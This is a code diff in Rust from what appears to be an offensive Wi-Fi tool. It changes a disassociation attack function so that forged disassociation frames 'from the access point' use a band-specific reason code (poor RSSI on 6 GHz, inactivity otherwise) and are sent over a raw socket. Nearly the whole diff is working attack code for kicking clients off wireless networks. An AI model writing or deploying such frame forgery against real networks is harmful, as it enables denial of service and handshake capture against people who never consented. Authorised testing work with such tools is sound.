@@ -13,7 +13,7 @@ use libwifi::{
     },
     parse_frame, Addresses, Frame,
 };
-use nl80211_ng::channels::WiFiChannel;
+use nl80211_ng::channels::{WiFiBand, WiFiChannel};
 use rand::seq::SliceRandom;
 
 use crate::{
@@ -144,8 +144,27 @@ pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<
             build_disassocation_from_client(ap_mac, &deauth_client, oxide.counters.sequence1());
         let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
 
-        let frx = build_disassocation_from_ap(ap_mac, &deauth_client, oxide.counters.sequence1());
-        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        if ap_data
+            .channel
+            .clone()
+            .is_some_and(|f| f.get_band() == WiFiBand::Band6GHz)
+        {
+            let frx = build_disassocation_from_ap(
+                ap_mac,
+                &deauth_client,
+                oxide.counters.sequence1(),
+                DeauthenticationReason::DisassociatedDueToPoorRSSI,
+            );
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        } else {
+            let frx = build_disassocation_from_ap(
+                ap_mac,
+                &deauth_client,
+                oxide.counters.sequence1(),
+                DeauthenticationReason::DisassociatedDueToInactivity,
+            );
+            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+        }
 
         ap_data.interactions += 1;
         oxide.status_log.add_message(StatusMessage::new(
